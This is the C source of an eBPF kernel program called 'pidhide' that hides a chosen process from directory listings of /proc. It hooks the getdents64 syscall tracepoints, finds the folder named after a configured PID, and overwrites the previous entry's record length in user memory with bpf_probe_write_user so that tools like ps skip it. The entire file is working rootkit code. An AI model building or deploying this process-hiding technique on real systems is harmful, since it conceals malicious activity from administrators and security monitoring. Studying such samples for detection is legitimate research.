#include "pidhide_kern.h"

// string pid becomes name of the folder in /proc/
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN];

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
  size_t pid_tgid = bpf_get_current_pid_tgid();

  // store params in map for exit function
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
  bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

  return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
  size_t pid_tgid = bpf_get_current_pid_tgid();
  int total_bytes_read = ctx->ret;

  // if bytes_read is 0, everything's been read
  if (total_bytes_read <= 0)
  {
    return 0;
  }

  // check we stored the address of the buffer from the syscall entry
  long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
  if (pbuff_addr == 0)
  {
    return 0;
  }

  // 'handle_getdents_exit' is called in a loop to iterate over the file listing
  // in chunks of 200, to check if a folder with the name of our pid is in there.
  // when it's found, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual patching
  long unsigned int buff_addr = *pbuff_addr;
  struct linux_dirent64 *dirp = 0;
  short unsigned int d_reclen = 0;
  char filename[MAX_PID_LEN];

  unsigned int bpos = 0;
  unsigned int *p_bros = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
  if (p_bros != 0)
  {
    bpos = *p_bros;
  }

  for (int i = 0; i < 200; i ++)
  {
    if (bpos >= total_bytes_read)
    {
      break;
    }
    dirp = (struct linux_dirent64 *)(buff_addr+bpos);
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

    int j = 0;
    for (j = 0; j < pid_to_hide_len; j++)
    {
      if (filename[j] != pid_to_hide[j])
      {
        break;
      }
    }
    if (j == pid_to_hide_len)
    {
      // folder is found, remove it
      bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
      bpf_map_delete_elem(&map_buffs, &pid_tgid);
      bpf_tail_call(ctx, &map_prog_array, PIDHIDE_PROG_02);
    }
    bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
    bpos += d_reclen;
  }

  // if the folder is not found, but there's still more to read, keep looking
  if (bpos < total_bytes_read)
  {
    bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
    bpf_tail_call(ctx, &map_prog_array, PIDHIDE_PROG_01);
  }
  bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
  bpf_map_delete_elem(&map_buffs, &pid_tgid);

  return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
  // only patch if we've already checked and found our pid's folder to hide
  size_t pid_tgid = bpf_get_current_pid_tgid();
  long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
  if (pbuff_addr == 0)
  {
    return 0;
  }

  // unlink target, by reading in previous linux_dirent64 struct,
  // and setting it's d_reclen to cover itself and our target.
  // this will make the program skip over our folder.
  long unsigned int buff_addr = *pbuff_addr;
  struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
  short unsigned int d_reclen_previous = 0;
  bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

  struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
  short unsigned int d_reclen = 0;
  bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

  // attempt to overwrite
  short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
  long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

  // send an event
  struct event *event;
  event = bpf_ringbuf_reserve(&rb, sizeof(*event), 0);
  if (event)
  {
    event->success = (ret == 0);
    event->pid = (pid_tgid >> 32);
    bpf_get_current_comm(&event->comm, sizeof(event->comm));
    bpf_ringbuf_submit(event, 0);
  }

  bpf_map_delete_elem(&map_to_patch, &pid_tgid);
  return 0;
}

char _license[] SEC("license") = "Dual MIT/GPL";